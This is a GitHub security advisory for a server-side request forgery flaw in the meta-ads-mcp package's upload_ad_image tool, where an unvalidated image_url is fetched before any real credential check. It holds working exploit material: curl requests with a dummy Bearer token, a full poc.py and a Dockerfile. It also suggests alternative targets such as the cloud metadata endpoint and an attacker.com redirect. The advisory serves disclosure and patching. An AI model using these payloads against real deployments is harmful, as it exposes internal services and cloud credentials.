# [H] meta-ads-mcp: Server-Side Request Forgery (SSRF) in `upload_ad_image` via Unrestricted `image_url` Fetch

## Summary
Severity: High
Advisory: GHSA-45gf-fjxp-cjpq
CVE: CVE-2026-54549
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2026-07-17
Source: https://github.com/advisories/GHSA-45gf-fjxp-cjpq
Type: github-advisory

## Affected
- PyPI: `meta-ads-mcp` — affected >=0 <1.0.115

## Details
## Server-Side Request Forgery (SSRF) in `upload_ad_image` via Unrestricted `image_url` Fetch

### Summary

The `upload_ad_image` MCP tool in `meta-ads-mcp` v1.0.113 passes an attacker-controlled `image_url` parameter directly to an HTTP fetch helper (`httpx.AsyncClient(follow_redirects=True).get(url)`) without any scheme, host, or IP address validation. When the server is deployed with the `streamable-http` transport (a documented, officially supported mode), an unauthenticated remote attacker can supply an arbitrary URL—including `http://127.0.0.1/`, RFC 1918 addresses, or cloud metadata endpoints such as `http://169.254.169.254/`—and cause the server to issue an outbound HTTP request to that target. The `Authorization` middleware only verifies that a non-empty Bearer token is present; actual Meta API credential validation occurs *after* the image download, so any dummy Bearer token bypasses the pre-fetch check. This constitutes a full, unauthenticated Server-Side Request Forgery with a confirmed CVSS 3.1 Base Score of 8.3 (High).

### Details

**Source**

`meta_ads_mcp/core/ads.py`, line 1316–1322: The MCP tool `upload_ad_image` is registered with `@mcp_server.tool()` and exposes `image_url: Optional[str]` as a direct tool argument that is fully attacker-controlled over the network.

```python
# meta_ads_mcp/core/ads.py
1316: @mcp_server.tool()
1318: async def upload_ad_image(
1322:     image_url: Optional[str] = None,
```

**Propagation**

`meta_ads_mcp/core/ads.py`, line 1389: The value is forwarded to `try_multiple_download_methods(image_url)` without any sanitization or validation.

```python
# meta_ads_mcp/core/ads.py
1389:     image_bytes = await try_multiple_download_methods(image_url)
```

**Sinks**

`meta_ads_mcp/core/utils.py` contains three independent HTTP fetch paths, all using `httpx.AsyncClient` with `follow_redirects=True` and no URL, host, or IP validation:

```python
# meta_ads_mcp/core/utils.py
166:     async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as client:
168:         response = await client.get(url, headers=headers)

214:     async with httpx.AsyncClient(follow_redirects=True) as client:
215:         response = await client.get(url, headers=headers, timeout=30.0)

224:     async with httpx.AsyncClient(follow_redirects=True) as client:
228:         response = await client.get(url, timeout=30.0)
```

**Authorization bypass**

`meta_ads_mcp/core/http_auth_integration.py`, lines 78–82: The middleware extracts any non-empty Bearer token value and places it into request context without validating it against Meta's API. The actual Meta OAuth token check (in `meta_ads_mcp/core/api.py:415`) occurs only after the image download completes, meaning the SSRF sink fires before any meaningful credential verification.

**Absence of sanitization**

A search for `urlparse`, `urlsplit`, `ipaddress`, `localhost`, `127.0.0.1`, `169.254`, `private`, `allowlist`, `blocklist`, or `is_global` in `meta_ads_mcp/core/ads.py` and `meta_ads_mcp/core/utils.py` returns no matches. No URL, scheme, hostname, or IP validation is present anywhere in the fetch path.

**Transport exposure**

`meta_ads_mcp/core/server.py`, line 219: The `--transport streamable-http` mode is a documented, officially supported deployment option (not a development-only stub), meaning the attack surface is reachable over the network in production deployments.

### PoC

**Environment setup**

```bash
# Build and run the Docker image (includes vulnerable meta-ads-mcp v1.0.113 and poc.py)
docker build -f vuln-001/Dockerfile \
  -t meta-ads-ssrf-poc \
  reports/pypiAi_615_pipeboard-co__meta-ads-mcp/

docker run --rm meta-ads-ssrf-poc
# Exit code 0 = SSRF confirmed
```

**Manual reproduction (two terminals)**

```bash
# Terminal 1 — SSRF capture listener on port 9009
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("SSRF GET", self.path, flush=True)
        body = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"
        self.send_response(200)
        self.send_header("Content-Type", "image/jpeg")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
HTTPServer(("127.0.0.1", 9009), H).serve_forever()
PY

# Terminal 2 — start the vulnerable MCP server
META_APP_ID=dummy META_APP_SECRET=dummy \
  python3 -m meta_ads_mcp --transport streamable-http --host 0.0.0.0 --port 8080
```

**Exploit request**

```bash
# 1. Initialize MCP session
curl -sS -X POST http://127.0.0.1:8080/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "Authorization: Bearer dummy-token" \
  -d '{"jsonrpc":"2.0","method":"initialize","id":0,"params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'

# 2. Send SSRF payload — image_url points to internal listener
curl -sS -X POST http://127.0.0.1:8080/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "Authorization: Bearer dummy-token" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "id": 1,
    "params": {
      "name": "upload_ad_image",
      "arguments": {
        "account_id": "act_123456789",
        "image_url": "http://127.0.0.1:9009/poc.jpg"
      }
    }
  }'
```

**Expected result**

Terminal 1 prints:
```
SSRF GET /poc.jpg
```

The `curl` response returns an OAuth error from Meta (because the dummy token is invalid), but the inbound `GET /poc.jpg` request to the internal listener has already been received, confirming that the server-side fetch executes before any credential validation.

**Confirmed runtime evidence (from Docker run)**

```
[SSRF LISTENER] Received GET '/poc.jpg' from 127.0.0.1 | User-Agent: 'curl/8.4.0'
[PASS] SSRF CONFIRMED — MCP server issued 1 request(s) to 127.0.0.1:9009
  -> GET /poc.jpg  |  User-Agent: 'curl/8.4.0'
```

**Alternative targets**

Replace `http://127.0.0.1:9009/poc.jpg` with:
- `http://169.254.169.254/latest/meta-data/` — cloud instance metadata (AWS/GCP/Azure)
- `http://10.0.0.1/` — RFC 1918 internal network services
- `http://attacker.com/redirect` — a public URL that redirects to an internal target (exploitable via `follow_redirects=True`)

### Impact

This is a Server-Side Request Forgery (SSRF) vulnerability. Any party capable of sending a JSON-RPC `tools/call` request to the MCP HTTP endpoint—using any non-empty Bearer token string—can instruct the server to make arbitrary outbound HTTP GET requests, including to:

- **Localhost services**: databases, admin panels, internal APIs, and other processes bound to `127.0.0.1` on the host
- **RFC 1918 / private network addresses**: internal microservices, Kubernetes control planes, cloud-internal load balancers
- **Cloud instance metadata endpoints**: `http://169.254.169.254/` (AWS IMDSv1, GCP, Azure), potentially exposing IAM credentials, instance identity documents, and bootstrap secrets
- **Redirect-chained internal targets**: any internal host reachable via a public-to-private redirect, because `follow_redirects=True` is set on all three fetch paths without re-validation at each hop

The SSRF fires *before* Meta API credential validation, so no valid Meta OAuth token is required. The impact spans confidentiality (internal data exfiltration), integrity (requests that trigger state-changing actions on internal services), and limited availability (internal service disruption).

Operators deploying `meta-ads-mcp` with `--transport streamable-http` in environments co-located with sensitive internal services or cloud metadata services are directly at risk.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.11-slim

# Install system build dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends gcc && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Install pip and uv for fast dependency installation
RUN pip install --upgrade pip && pip install uv

# Install Python dependencies from the cloned repo
COPY repo/requirements.txt .
RUN uv pip install --system -r requirements.txt

# Copy the full application source (cloned repo)
COPY repo/ .

# Install the package in editable mode (no extra deps, already installed above)
RUN pip install --no-deps -e .

# Copy the PoC exploit script into the image
COPY vuln-001/poc.py /poc.py

# Run the PoC by default; exit code 0 = SSRF confirmed, 1 = not reproduced, 2 = setup error
CMD ["python3", "/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via upload_ad_image image_url in meta-ads-mcp v1.0.113
CWE-918 - Server-Side Request Forgery (unrestricted server-side HTTP fetch)

Attack flow:
  1. Attacker sends tools/call for upload_ad_image with image_url="http://127.0.0.1:9009/poc.jpg"
  2. MCP server calls try_multiple_download_methods(image_url) with no URL validation
  3. httpx.AsyncClient(follow_redirects=True).get("http://127.0.0.1:9009/poc.jpg") fires
  4. SSRF listener records the inbound GET, proving the server issued the request

Authorization bypass: only a non-empty Bearer token string is required before the fetch;
the actual Meta API credential check happens after the image download.
"""

import threading
import subprocess
import time
import json
import sys
import socket
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

import httpx

# ── Configuration ─────────────────────────────────────────────────────────────
SSRF_PORT = 9009       # Port for the SSRF capture listener
MCP_PORT  = 8080       # Port for the vulnerable MCP server
SSRF_PATH = "/poc.jpg" # Path that the MCP server will request (SSRF indicator)

# ── Shared state ──────────────────────────────────────────────────────────────
ssrf_hits: list = []
ssrf_lock = threading.Lock()


# ── SSRF capture listener ─────────────────────────────────────────────────────

class SSRFCaptureHandler(BaseHTTPRequestHandler):
    """Records every inbound GET request made by the vulnerable MCP server."""

    def do_GET(self):
        hit = {
            "method": "GET",
            "path": self.path,
            "host": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
        }
        with ssrf_lock:
            ssrf_hits.append(hit)
        print(
            f"[SSRF LISTENER] Received GET {self.path!r}"
            f" from {self.client_address[0]}"
            f" | User-Agent: {hit['user_agent']!r}",
            flush=True,
        )
        # Return a minimal valid JPEG so the server processes the response
        body = (
            b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            b"\xff\xd9"
        )
        self.send_response(200)
        self.send_header("Content-Type", "image/jpeg")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass  # Suppress default access log to keep output clean


def start_ssrf_listener() -> None:
    server = HTTPServer(("127.0.0.1", SSRF_PORT), SSRFCaptureHandler)
    server.serve_forever()


# ── Helpers ───────────────────────────────────────────────────────────────────

def wait_for_port(host: str, port: int, timeout: float = 30.0) -> bool:
    """Poll until the TCP port is accepting connections or timeout expires."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1.0):
                return True
        except (ConnectionRefusedError, OSError):
            time.sleep(0.5)
    return False


def mcp_post(
    method: str,
    params: dict,
    req_id: int,
    session_id: str | None = None,
) -> httpx.Response:
    """Send a single JSON-RPC 2.0 request to the MCP streamable-HTTP endpoint.

    Path is /mcp (no trailing slash) — FastMCP 1.23.0 redirects /mcp/ → /mcp
    with HTTP 307, so we skip the redirect by targeting the canonical path directly.
    Accept header must include text/event-stream; without it the server returns 406.
    """
    headers = {
        "Content-Type": "application/json",
        # MCP streamable-HTTP requires both JSON and SSE in Accept; omitting
        # text/event-stream causes HTTP 406 from the FastMCP uvicorn handler.
        "Accept": "application/json, text/event-stream",
        # Dummy Bearer token — the middleware only checks that it is non-empty;
        # Meta API credential validation happens AFTER the image download (SSRF sink).
        "Authorization": "Bearer dummy-ssrf-poc-token",
    }
    if session_id:
        headers["Mcp-Session-Id"] = session_id

    payload = {"jsonrpc": "2.0", "method": method, "id": req_id, "params": params}
    with httpx.Client(timeout=30.0) as client:
        return client.post(
            f"http://127.0.0.1:{MCP_PORT}/mcp",  # no trailing slash
            json=payload,
            headers=headers,
        )


# ── Main PoC ──────────────────────────────────────────────────────────────────

def main() -> int:
    print("=" * 65, flush=True)
    print("VULN-001 PoC  —  SSRF in meta-ads-mcp upload_ad_image (v1.0.113)", flush=True)
    print("CWE-918 | CVSS 8.3 | image_url fetch has zero URL validation", flush=True)
    print("=" * 65, flush=True)

    # ── Step 1: Start the SSRF capture listener ────────────────────────────
    t = threading.Thread(target=start_ssrf_listener, daemon=True)
    t.start()
    time.sleep(0.3)
    print(f"[+] SSRF capture listener running on 127.0.0.1:{SSRF_PORT}", flush=True)

    # ── Step 2: Start the vulnerable MCP server ────────────────────────────
    env = os.environ.copy()
    # Dummy credentials so the server starts; the Meta API is only called after
    # the image has already been fetched (i.e., after the SSRF fires).
    env.setdefault("META_APP_ID", "poc-dummy-app-id")
    env.setdefault("META_APP_SECRET", "poc-dummy-secret")
    env.setdefault("PIPEBOARD_API_TOKEN", "")

    proc = subprocess.Popen(
        [
            sys.executable, "-m", "meta_ads_mcp",
            "--transport", "streamable-http",
            "--host", "127.0.0.1",
            "--port", str(MCP_PORT),
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        env=env,
        cwd="/app",
    )
    print(f"[*] Waiting for MCP server to bind on 127.0.0.1:{MCP_PORT} ...", flush=True)

    # ── Step 3: Wait for server readiness ─────────────────────────────────
    if not wait_for_port("127.0.0.1", MCP_PORT, timeout=30):
        try:
            out, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            out = ""
        print(f"[FAIL] MCP server did not start within 30 s.\nServer output:\n{out}", flush=True)
        return 2
    print(f"[+] MCP server is up on 127.0.0.1:{MCP_PORT}", flush=True)
    time.sleep(0.5)

    # ── Step 4: MCP protocol initialization ───────────────────────────────
    # The streamable-HTTP transport requires a brief initialize / initialized
    # handshake before accepting tool calls.
    session_id = None
    try:
        resp = mcp_post(
            "initialize",
            {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "ssrf-poc", "version": "1.0"},
            },
            req_id=0,
        )
        print(f"[*] initialize -> HTTP {resp.status_code}", flush=True)
        session_id = resp.headers.get("Mcp-Session-Id")
        if session_id:
            print(f"[*] Session ID: {session_id}", flush=True)
            notif_headers = {
                "Content-Type": "application/json",
                "Authorization": "Bearer dummy-ssrf-poc-token",
                "Mcp-Session-Id": session_id,
            }
            notif_payload = {
                "jsonrpc": "2.0",
                "method": "notifications/initialized",
                "params": {},
            }
            with httpx.Client(timeout=10.0) as client:
                nr = client.post(
                    f"http://127.0.0.1:{MCP_PORT}/mcp",  # no trailing slash
                    json=notif_payload,
                    headers=notif_headers,
                )
            print(f"[*] notifications/initialized -> HTTP {nr.status_code}", flush=True)
    except Exception as exc:
        print(f"[*] Initialization step error (non-fatal): {exc}", flush=True)

    # ── Step 5: Send the SSRF exploit payload ─────────────────────────────
    ssrf_url = f"http://127.0.0.1:{SSRF_PORT}{SSRF_PATH}"
    print(f"\n[*] Sending exploit request ...", flush=True)
    print(f"    method        : tools/call", flush=True)
    print(f"    tool          : upload_ad_image", flush=True)
    print(f"    image_url     : {ssrf_url}  <-- SSRF payload", flush=True)
    print(f"    Authorization : Bearer dummy-ssrf-poc-token  (not validated before fetch)", flush=True)

    try:
        resp = mcp_post(
            "tools/call",
            {
                "name": "upload_ad_image",
                "arguments": {
                    "account_id": "act_123456789",
                    "image_url": ssrf_url,
                },
            },
            req_id=1,
            session_id=session_id,
        )
        print(f"\n[*] tools/call -> HTTP {resp.status_code}", flush=True)
        print(f"[*] Response preview (first 400 chars):\n{resp.text[:400]}", flush=True)
    except Exception as exc:
        print(f"[*] tools/call exception: {exc}", flush=True)

    # ── Step 6: Allow time for async fetch to complete ────────────────────
    time.sleep(4)
    proc.terminate()

    # ── Step 7: Evaluate and report ───────────────────────────────────────
    print("\n" + "=" * 65, flush=True)
    with ssrf_lock:
        hits = list(ssrf_hits)

    if hits:
        print(
            f"[PASS] SSRF CONFIRMED — MCP server issued {len(hits)} request(s) to"
            f" 127.0.0.1:{SSRF_PORT}",
            flush=True,
        )
        for h in hits:
            print(
                f"  -> {h['method']} {h['path']}"
                f"  |  User-Agent: {h['user_agent']!r}",
                flush=True,
            )
        print(
            "\nConclusion: upload_ad_image passes attacker-controlled image_url to"
            " httpx.AsyncClient(follow_redirects=True).get(url) without any scheme,"
            " host, or IP validation. Internal services are reachable via SSRF.",
            flush=True,
        )
        print("=" * 65, flush=True)
        return 0
    else:
        print(
            f"[FAIL] No requests received on SSRF listener at 127.0.0.1:{SSRF_PORT}.",
            flush=True,
        )
        print("=" * 65, flush=True)
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

## References
- https://github.com/pipeboard-co/meta-ads-mcp/security/advisories/GHSA-45gf-fjxp-cjpq
- https://github.com/pipeboard-co/meta-ads-mcp/commit/7d9926336bbdac6285a988d043c4ccfe126c94c5
- https://github.com/pipeboard-co/meta-ads-mcp
- https://github.com/pipeboard-co/meta-ads-mcp/releases/tag/1.0.115
